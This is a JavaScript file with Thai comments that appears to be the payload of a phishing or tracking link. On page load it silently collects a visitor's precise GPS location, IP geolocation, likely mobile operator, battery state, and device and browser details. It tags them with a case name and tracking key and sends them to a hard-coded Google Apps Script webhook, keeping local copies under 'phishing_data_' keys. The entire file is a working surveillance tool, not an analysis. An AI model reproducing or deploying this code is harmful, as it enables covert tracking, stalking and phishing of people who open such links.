// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)

    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName); // Log caseName ด้วย

    return {
      trackingKey: trackingKey,
      caseName: caseName // คืนค่า caseName ด้วย
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// เพิ่มตัวแปรเก็บข้อมูล GPS แบบ global เพื่อให้ทุกฟังก์ชันเข้าถึงได้
let gpsLocation = {
  lat: null,
  long: null,
  accuracy: null,
  timestamp: null
};

// เพิ่มตัวแปรควบคุมสถานะการเก็บข้อมูล
let dataCollected = {
  basicInfo: false,
  deviceInfo: false,
  gpsInfo: false,
  batteryInfo: false,
  ipInfo: false
};

// ฟังก์ชันดึงข้อมูลตำแหน่ง GPS แบบปรับปรุงใหม่
function getGPSLocation() {
  return new Promise((resolve, reject) => {
    console.log("กำลังเริ่มดึงข้อมูล GPS...");
    
    // ตรวจสอบว่าเบราว์เซอร์รองรับ Geolocation API หรือไม่
    if (!navigator.geolocation) {
      console.warn("เบราว์เซอร์ไม่รองรับ Geolocation API");
      dataCollected.gpsInfo = true; // ถือว่าเสร็จแล้ว แม้จะไม่ได้ข้อมูล
      return resolve(null);
    }
    
    // ตั้งค่าตัวเลือกสำหรับการดึงข้อมูล GPS
    const options = {
      enableHighAccuracy: true, // ขอความแม่นยำสูงสุด
      timeout: 10000,           // ตั้งเวลาหมดเวลาที่ 10 วินาที
      maximumAge: 0             // ไม่ใช้ข้อมูล cache เก่า
    };
    
    // ใช้ getCurrentPosition เพื่อดึงข้อมูลทันที
    navigator.geolocation.getCurrentPosition(
      // Success callback
      (position) => {
        console.log("ได้รับข้อมูล GPS แล้ว:", position);
        // บันทึกข้อมูลใน global variable
        gpsLocation = {
          lat: position.coords.latitude,
          long: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp || new Date().getTime()
        };
        
        // สร้าง URL สำหรับ Google Maps
        gpsLocation.gmapLink = `https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.long}`;
        
        console.log("ข้อมูล GPS ที่บันทึก:", gpsLocation);
        dataCollected.gpsInfo = true;
        resolve(gpsLocation);
      },
      // Error callback
      (error) => {
        console.warn("เกิดข้อผิดพลาดในการดึงข้อมูล GPS:", error.message);
        // จัดการข้อผิดพลาดตามรหัส
        let errorMessage = "ไม่สามารถดึงข้อมูลตำแหน่งได้";
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = "ผู้ใช้ปฏิเสธการขอตำแหน่ง";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = "ข้อมูลตำแหน่งไม่พร้อมใช้งาน";
            break;
          case error.TIMEOUT:
            errorMessage = "การขอตำแหน่งใช้เวลานานเกินกำหนด";
            break;
        }
        dataCollected.gpsInfo = true; // ถือว่าดำเนินการเสร็จแล้ว แม้จะมีข้อผิดพลาด
        resolve(null);
      },
      options
    );
  });
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  console.log("script.js execution started."); // *** เพิ่ม Log ***

  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  dataCollected.basicInfo = true;

  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // --- เพิ่มการตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
      console.error("Invalid or missing tracking key. Halting script execution.");
      // อาจจะแสดงข้อความบนหน้าจอ หรือ redirect
      // document.body.innerHTML = "Access Denied: Invalid Tracking Key";
      return; // หยุดการทำงานของสคริปต์
  }
  console.log("Tracking key is present:", trackingKey);

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();
  dataCollected.deviceInfo = true;

  console.log("Device Info:", deviceInfo);
  console.log("Connection Info:", connection);
  console.log("Browser Info:", browser);

  // ดำเนินการเก็บข้อมูลแบบ parallel โดยใช้ Promise
  const collectData = async () => {
    try {
      // เริ่มเก็บข้อมูล GPS ทันทีเพื่อให้ขอสิทธิ์ตั้งแต่ต้น
      const gpsPromise = getGPSLocation();
      
      // เก็บข้อมูล IP ด้วย API ภายนอก (จะรันขนานกับการขอ GPS)
      const ipPromise = getIPDetails();
      
      // เก็บข้อมูลแบตเตอรี่ (จะรันขนานกับอันอื่น)
      const batteryPromise = getBatteryInfo();

      // ประมาณการเบอร์โทรศัพท์ (สามารถรันขนานได้)
      const phonePromise = estimatePhoneNumber();
      
      // รอให้ทุกการทำงานเสร็จสิ้น
      const [gpsData, ipData, batteryData, phoneData] = await Promise.all([
        gpsPromise, ipPromise, batteryPromise, phonePromise
      ]);
      
      // บันทึกข้อมูลที่ได้
      const locationData = gpsData || { lat: null, long: null, accuracy: null, message: "ไม่สามารถดึงข้อมูล GPS ได้" };
      
      // สร้างข้อมูลที่จะส่งไปยัง webhook
      const dataToSend = {
        trackingKey,
        caseName,
        timestamp,
        ip: ipData || { ip: "ไม่สามารถระบุได้" },
        deviceInfo: {
          ...deviceInfo,
          screenSize,
          colorDepth: screenColorDepth,
          pixelRatio: devicePixelRatio,
          language,
          connection,
          browser,
          battery: batteryData || { level: "ไม่ทราบ", charging: "ไม่ทราบ" }
        },
        location: locationData,
        phoneInfo: phoneData || { mobileOperator: "ไม่สามารถระบุได้" },
        referrer,
        source: new URLSearchParams(window.location.search).get('source') || "link",
        requestId: generateUniqueId()
      };
      
      // ส่งข้อมูลไปยัง webhook
      sendToLineNotify(dataToSend);
      
    } catch (error) {
      console.error("เกิดข้อผิดพลาดในการเก็บข้อมูล:", error);
      // ส่งข้อมูลที่มีอยู่ไปยัง webhook แม้จะเกิดข้อผิดพลาด
      sendToLineNotify({
        trackingKey,
        caseName,
        timestamp,
        error: error.message,
        deviceInfo,
        requestId: generateUniqueId()
      });
    }
  };

  // เริ่มเก็บข้อมูลทันที
  collectData();
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  // สร้าง ID ที่คาดเดายากขึ้นเล็กน้อย
  const timestamp = Date.now().toString(36);
  const randomPart = Math.random().toString(36).substring(2, 10);
  return `req-${timestamp}-${randomPart}`;
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
  let deviceType = "คอมพิวเตอร์";  
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";
  let osName = "ไม่สามารถระบุได้";
  let osVersion = "ไม่ระบุ";

  // ตรวจจับ iPad อย่างถูกต้อง
  const isIPad = detectIPad();

  // ตรวจจับ Device Type
  if (isIPad) {
    deviceType = "แท็บเล็ต";
    deviceBrand = "Apple";
    const deviceDetails = getIPadModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iPadOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ";
    deviceBrand = "Apple";
    const deviceDetails = getIPhoneModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/android/i.test(userAgent)) {
    const androidInfo = getAndroidInfo(userAgent);
    deviceType = "มือถือ";
    deviceBrand = androidInfo.brand;
    deviceModel = androidInfo.model;
    osName = "Android";
    osVersion = androidInfo.osVersion.replace('Android ', '');
    osInfo = androidInfo.osVersion;
  } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Apple";
    osName = "macOS";
    osVersion = getMacOSVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Windows|Win64|Win32/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Windows PC";
    osName = "Windows";
    osVersion = getWindowsVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Linux/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Linux PC";
    osName = "Linux";
    osVersion = "ไม่ระบุ";
    osInfo = "Linux";
  }

  // จัดรูปแบบ platform ให้สอดคล้องกัน
  let platformName = osName;

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    osInfo: osInfo,
    osName: osName,
    osVersion: osVersion,
    platform: platformName,
    deviceBrand: deviceBrand
  };
}

// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ
function detectIPad() {
  const ua = navigator.userAgent;
  if (/iPad/.test(ua)) return true;
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) return true; // iPadOS 13+
  // เพิ่มการตรวจสอบผ่าน platform API ถ้ามี
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPad
function getIPadModel(ua) {
  let model = "iPad";
  let version = "ไม่ระบุ";
  
  version = getIOSVersion(ua);
  
  // ตรรกะการระบุรุ่น iPad (อาจต้องอัปเดตตามรุ่นใหม่ๆ)
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // มีข้อมูลรหัสรุ่นเฉพาะ เช่น iPad13,1
    model = `iPad (${modelMatch[1]})`;
  } else {
    // ไม่มีข้อมูลรหัสรุ่น ใช้ชื่อทั่วไป
    model = "iPad";
  }
  
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่น iPhone
function getIPhoneModel(ua) {
  let model = "iPhone";
  let version = "ไม่ระบุ";
  
  version = getIOSVersion(ua);
  
  // ตรรกะการระบุรุ่น iPhone (อาจต้องอัปเดต)
  const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // มีข้อมูลรหัสรุ่นเฉพาะ เช่น iPhone13,1
    model = `iPhone (${modelMatch[1]})`;
  } else {
    // ไม่มีข้อมูลรหัสรุ่น ใช้ชื่อทั่วไป
    model = "iPhone";
  }
  
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
function getAndroidInfo(ua) {
  let brand = "Android";
  let model = "ไม่ทราบรุ่น";
  let osVersion = "ไม่ทราบ";

  // ดึงเวอร์ชัน Android
  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) {
    osVersion = androidVersionMatch[1];
  }

  // ตรวจสอบยี่ห้อและรุ่น (ปรับปรุง regex และ logic)
  try {
    let modelInfo = ua.substring(ua.indexOf('(') + 1);
    modelInfo = modelInfo.substring(0, modelInfo.indexOf(')'));
    const modelParts = modelInfo.split(';').map(part => part.trim()).filter(part => part && part !== 'Android');
    
    if (modelParts.length > 1) {
      // พยายามระบุแบรนด์และรุ่น
      const commonBrands = ['Samsung', 'Xiaomi', 'Redmi', 'POCO', 'Huawei', 'Oppo', 'Vivo', 'OnePlus', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC'];
      
      for (let i = 0; i < modelParts.length; i++) {
        const part = modelParts[i];
        
        // ตรวจสอบว่า part นี้มีชื่อแบรนด์หรือไม่
        const foundBrand = commonBrands.find(b => part.includes(b));
        if (foundBrand) {
          brand = foundBrand;
          // ใช้ส่วนที่ถัดไปเป็นรุ่น (ถ้ามี)
          if (i + 1 < modelParts.length) {
            model = modelParts[i + 1];
          } else {
            model = part.replace(foundBrand, '').trim() || "ไม่ทราบรุ่น";
          }
          break;
        }
        
        // หากไม่พบแบรนด์เฉพาะ ใช้ส่วนแรกที่ไม่ใช่ Android เป็นรุ่น
        if (i === modelParts.length - 1) {
          model = part;
        }
      }
    } else if (modelParts.length === 1) {
      model = modelParts[0];
    }
  } catch (error) {
    console.error("Error parsing Android info:", error);
    model = "ไม่สามารถระบุรุ่นได้";
  }

  return {
    brand: brand,
    model: model,
    osVersion: `Android ${osVersion}`
  };
}

// ฟังก์ชันดึงเวอร์ชัน iOS
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i);
  if (match) {
    return match[1].replace(/_/g, '.');
  }
  // Fallback for older formats or WebKit version
  const webkitMatch = ua.match(/Version\/([\d\.]+)/i);
  if (webkitMatch) {
    return webkitMatch[1];
  }
  return "ไม่ทราบเวอร์ชัน";
}

// ฟังก์ชันดึงเวอร์ชัน macOS
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
    if (version.startsWith('14')) return "Sonoma";
    if (version.startsWith('13')) return "Ventura";
    if (version.startsWith('12')) return "Monterey";
    if (version.startsWith('11')) return "Big Sur";
    if (version.startsWith('10.15')) return "Catalina";
    if (version.startsWith('10.14')) return "Mojave";
    // เพิ่มเติมตามต้องการ
    return `macOS ${version}`;
  }
  return "macOS";
}

// ฟังก์ชันดึงเวอร์ชัน Windows
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10";
  if (/Windows NT 6.3/.test(ua)) return "8.1";
  if (/Windows NT 6.2/.test(ua)) return "8";
  if (/Windows NT 6.1/.test(ua)) return "7";
  // เพิ่มเติมตามต้องการ
  return "เวอร์ชันเก่า";
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let info = {
    type: "ไม่ทราบ", // e.g., 'wifi', 'cellular', 'ethernet'
    effectiveType: "ไม่ทราบ", // e.g., '4g', '3g', '2g', 'slow-2g'
    downlink: null, // Mbps
    rtt: null, // ms
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่ทราบ" // Simplified type: WiFi, Mobile Data, Ethernet, Other
  };

  if (connection) {
    info.type = connection.type || "ไม่ทราบ";
    info.effectiveType = connection.effectiveType || "ไม่ทราบ";
    info.downlink = connection.downlink || null;
    info.rtt = connection.rtt || null;
    info.saveData = connection.saveData || false;

    if (info.type === 'wifi') {
      info.isWifi = true;
      info.networkType = "WiFi";
    } else if (info.type === 'cellular') {
      info.isMobile = true;
      // ใช้ effectiveType เพื่อประมาณความเร็ว
      if (info.effectiveType.includes('4g') || info.effectiveType.includes('5g')) info.networkType = "4G/5G";
      else if (info.effectiveType.includes('3g')) info.networkType = "3G";
      else if (info.effectiveType.includes('2g')) info.networkType = "2G";
      else info.networkType = "Mobile Data";
    } else if (info.type === 'ethernet') {
       info.networkType = "Ethernet";
    } else if (info.type !== 'unknown' && info.type !== 'none' && info.type !== 'other') {
       info.networkType = info.type; // ใช้ type โดยตรงถ้าไม่ใช่ค่าทั่วไป
    } else {
       // ถ้า type ไม่ชัดเจน ลองเดาจาก effectiveType
       if (info.effectiveType.includes('4g')) info.networkType = "Fast (4G-like)";
       else if (info.effectiveType.includes('3g')) info.networkType = "Medium (3G-like)";
       else if (info.effectiveType.includes('2g')) info.networkType = "Slow (2G-like)";
    }
  }

  return info;
}


// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    console.log("กำลังดึงข้อมูลแบตเตอรี่...");
    
    // ตรวจสอบว่าเบราว์เซอร์รองรับ Battery API หรือไม่
    if (!navigator.getBattery && !window.BatteryManager) {
      console.warn("เบราว์เซอร์ไม่รองรับ Battery API");
      dataCollected.batteryInfo = true;
      return null;
    }
    
    let battery;
    if (navigator.getBattery) {
      battery = await navigator.getBattery();
    } else if (navigator.battery || navigator.mozBattery) {
      battery = navigator.battery || navigator.mozBattery;
    } else {
      console.warn("ไม่สามารถเข้าถึง Battery API ได้");
      dataCollected.batteryInfo = true;
      return null;
    }
    
    const batteryData = {
      level: battery ? Math.round(battery.level * 100) + "%" : "ไม่ทราบ",
      charging: battery ? (battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ") : "ไม่ทราบ",
    };
    
    console.log("ข้อมูลแบตเตอรี่:", batteryData);
    dataCollected.batteryInfo = true;
    return batteryData;
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการดึงข้อมูลแบตเตอรี่:", error);
    dataCollected.batteryInfo = true;
    return null;
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
    const ua = navigator.userAgent;
    let browserName = "ไม่ทราบ";
    let fullVersion = "ไม่ทราบ";
    let majorVersion = "ไม่ทราบ";
    let nameOffset, verOffset, ix;

    // --- ตรวจสอบ In-App Browsers ก่อน ---
    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) {
        browserName = "Facebook App";
    } else if (ua.indexOf("Instagram") > -1) {
        browserName = "Instagram App";
    } else if (ua.indexOf("Line") > -1) {
        browserName = "LINE App";
        verOffset = ua.indexOf("Line/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 5);
    } else if (ua.indexOf("Twitter") > -1) {
        browserName = "Twitter App";
    } else if (ua.indexOf("CriOS") > -1) { // Chrome on iOS
        browserName = "Chrome iOS";
        verOffset = ua.indexOf("CriOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("FxiOS") > -1) { // Firefox on iOS
        browserName = "Firefox iOS";
        verOffset = ua.indexOf("FxiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("EdgiOS") > -1) { // Edge on iOS
        browserName = "Edge iOS";
        verOffset = ua.indexOf("EdgiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 7);
    }
    // --- ตรวจสอบเบราว์เซอร์หลัก ---
    else if ((verOffset = ua.indexOf("Edg")) != -1) { // Microsoft Edge (Chromium)
        browserName = "Edge";
        fullVersion = ua.substring(verOffset + 4);
    } else if ((verOffset = ua.indexOf("SamsungBrowser")) != -1) { // Samsung Internet
        browserName = "Samsung Internet";
        fullVersion = ua.substring(verOffset + 15);
    } else if ((verOffset = ua.indexOf("OPR")) != -1 || (verOffset = ua.indexOf("Opera")) != -1) { // Opera
        browserName = "Opera";
        if (ua.indexOf("OPR") != -1) fullVersion = ua.substring(verOffset + 4);
        else fullVersion = ua.substring(verOffset + 6);
    } else if ((verOffset = ua.indexOf("Chrome")) != -1) { // Chrome (ต้องอยู่หลัง Edge และ Opera)
        browserName = "Chrome";
        fullVersion = ua.substring(verOffset + 7);
    } else if ((verOffset = ua.indexOf("Safari")) != -1) { // Safari (ต้องอยู่หลัง Chrome)
        browserName = "Safari";
        fullVersion = ua.substring(verOffset + 7);
        if ((verOffset = ua.indexOf("Version")) != -1)
            fullVersion = ua.substring(verOffset + 8);
    } else if ((verOffset = ua.indexOf("Firefox")) != -1) { // Firefox
        browserName = "Firefox";
        fullVersion = ua.substring(verOffset + 8);
    } else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) { // Other browsers
        browserName = ua.substring(nameOffset, verOffset);
        fullVersion = ua.substring(verOffset + 1);
        if (browserName.toLowerCase() == browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }

    // ตัดเวอร์ชันที่ไม่จำเป็นออก
    if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(")")) != -1) fullVersion = fullVersion.substring(0, ix);

    majorVersion = parseInt('' + fullVersion, 10);
    if (isNaN(majorVersion)) {
        fullVersion = 'ไม่ทราบ';
        majorVersion = 'ไม่ทราบ';
    }

    // ตรวจสอบว่าเป็น WebView หรือไม่ (อาจไม่แม่นยำ 100%)
    let isWebView = (ua.indexOf("; wv") > -1) || // Android WebView
                    (ua.indexOf("iPhone") > -1 && ua.indexOf("Safari") === -1 && ua.indexOf("CriOS") === -1 && ua.indexOf("FxiOS") === -1) || // iOS WebView approximation
                    (browserName.includes("App")); // In-app browsers are WebViews

    return `${browserName} ${fullVersion}${isWebView ? ' (WebView)' : ''}`;
}


// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    console.log("กำลังดึงข้อมูล IP...");
    
    // เช็คว่ามี cache หรือไม่
    let cachedIPData = sessionStorage.getItem('ipinfo_cache');
    if (cachedIPData) {
      console.log("ใช้ข้อมูล IP จาก cache");
      dataCollected.ipInfo = true;
      return JSON.parse(cachedIPData);
    }
    
    // ใช้ fetch API เพื่อขอข้อมูล IP (มี timeout 5 วินาที)
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    const response = await fetch('https://ipinfo.io/json', { 
      signal: controller.signal 
    });
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      console.warn("ไม่สามารถดึงข้อมูล IP ได้:", response.statusText);
      dataCollected.ipInfo = true;
      return { ip: "ไม่สามารถระบุได้" };
    }
    
    const data = await response.json();
    console.log("ข้อมูล IP ที่ได้รับ:", data);
    
    // เก็บใน cache เพื่อลดการเรียกใช้ซ้ำ
    try {
      sessionStorage.setItem('ipinfo_cache', JSON.stringify(data));
    } catch (e) {
      console.warn("ไม่สามารถเก็บข้อมูล IP ใน cache ได้:", e);
    }
    
    dataCollected.ipInfo = true;
    return data;
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการดึงข้อมูล IP:", error);
    dataCollected.ipInfo = true;
    return { ip: "ไม่สามารถระบุได้", error: error.message };
  }
}


// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่อาจดึงได้จาก API อื่นๆ (ยากมาก)
    possibleOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่คาดเดาจาก ISP
    countryCode: "ไม่สามารถระบุได้", // รหัสประเทศจาก IP
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรง" // หมายเหตุ
  };

  try {
    // 1. ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails(); // เรียกใช้ฟังก์ชันที่ปรับปรุงแล้ว

    // ใช้ข้อมูล ISP/Org จาก ipDetails
    const ispInfo = ipDetails.isp || ipDetails.org || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP/Org
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // 2. ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country; // เก็บ Country Code (เช่น TH)
      // อาจจะแปลงเป็นรหัสโทรศัพท์ถ้าต้องการ เช่น +66 สำหรับ TH
    }

    // 3. ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? `(${phoneInfo.possibleOperator})` : "");
    } else if (connection && connection.type === 'wifi') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
    } else if (connection && connection.type === 'ethernet') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน Ethernet";
    }


    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error);
    return phoneInfo; // คืนค่าเริ่มต้นถ้าเกิดข้อผิดพลาด
  }
}


// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw0E3_YilJ8Na21dkQgHvw-6ZYfo6IxRX58i9IWMIo7iiFTpo5XYU_8rpZOKz_mFyA/exec';
  
  console.log("กำลังส่งข้อมูลไปยัง webhook:", JSON.stringify(dataToSend));
  
  // ใช้ Navigator.sendBeacon ถ้ามี เพื่อป้องกันการถูกยกเลิกเมื่อผู้ใช้ออกจากหน้า
  if (navigator.sendBeacon) {
    const blob = new Blob([JSON.stringify(dataToSend)], {type: 'application/json'});
    const success = navigator.sendBeacon(webhookUrl, blob);
    
    console.log("ส่งข้อมูลโดย sendBeacon:", success ? "สำเร็จ" : "ไม่สำเร็จ");
    
    // ถ้า sendBeacon ไม่สำเร็จ ให้ใช้ fetch แทน
    if (!success) {
      sendByFetch(webhookUrl, dataToSend);
    }
  } else {
    // ใช้ fetch ในกรณีที่ไม่มี sendBeacon
    sendByFetch(webhookUrl, dataToSend);
  }
  
  // เก็บข้อมูลในแบบ local backup
  try {
    const dataKey = `phishing_data_${dataToSend.trackingKey || 'unknown'}_${new Date().getTime()}`;
    localStorage.setItem(dataKey, JSON.stringify({
      data: dataToSend,
      sentTime: new Date().toISOString()
    }));
    
    // ลบข้อมูลเก่าถ้ามีมากกว่า 10 รายการ
    const keys = Object.keys(localStorage).filter(key => key.startsWith('phishing_data_'));
    if (keys.length > 10) {
      keys.sort().slice(0, keys.length - 10).forEach(key => localStorage.removeItem(key));
    }
  } catch (e) {
    console.warn("ไม่สามารถเก็บข้อมูลใน localStorage ได้:", e);
  }
}

// ฟังก์ชันส่งข้อมูลโดยใช้ fetch API
function sendByFetch(url, data) {
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  };
  
  fetch(url, options)
    .then(response => {
      console.log("ส่งข้อมูลสำเร็จ, สถานะ:", response.status);
    })
    .catch(error => {
      console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
      
      // พยายามส่งแบบ fallback โดยใช้ image request ในกรณีที่ fetch ล้มเหลว
      const img = new Image();
      const params = new URLSearchParams();
      params.append('data', JSON.stringify(data));
      img.src = `${url}?${params.toString()}&t=${new Date().getTime()}`;
    });
}
